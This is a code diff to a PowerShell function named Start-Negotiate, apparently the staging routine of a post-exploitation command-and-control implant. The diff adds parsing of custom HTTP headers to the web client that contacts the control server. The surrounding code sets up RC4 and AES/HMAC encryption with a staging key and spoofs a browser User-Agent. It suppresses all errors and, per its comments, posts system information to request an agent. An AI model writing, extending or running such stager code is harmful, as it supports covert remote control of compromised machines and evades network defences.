@@ -1,6 +1,6 @@
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
-
+    
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
         begin {
@@ -53,7 +53,7 @@ function Start-Negotiate {
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::ASCII;
-
+    $customHeaders = "";
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
@@ -91,6 +91,14 @@ function Start-Negotiate {
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
     # the User-Agent always resets for multiple calls...silly
+    if ($customHeaders -ne "") {
+        $headers = $customHeaders -split ',';
+        $headers | ForEach-Object {
+            $headerKey = $_.split(':')[0];
+            $headerValue = $_.split(':')[1];
+            $wc.Headers.Add($headerKey, $headerValue);
+        }
+    }
     $wc.Headers.Add("User-Agent",$UA);
     
     # RC4 routing packet:
@@ -163,6 +171,14 @@ function Start-Negotiate {
     $rc4p2 = $IV2 + $rc4p2 + $eb2;
 
     # the User-Agent always resets for multiple calls...silly
+    if ($customHeaders -ne "") {
+        $headers = $customHeaders -split ',';
+        $headers | ForEach-Object {
+            $headerKey = $_.split(':')[0];
+            $headerValue = $_.split(':')[1];
+            $wc.Headers.Add($headerKey, $headerValue);
+        }
+    }
     $wc.Headers.Add("User-Agent",$UA);
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
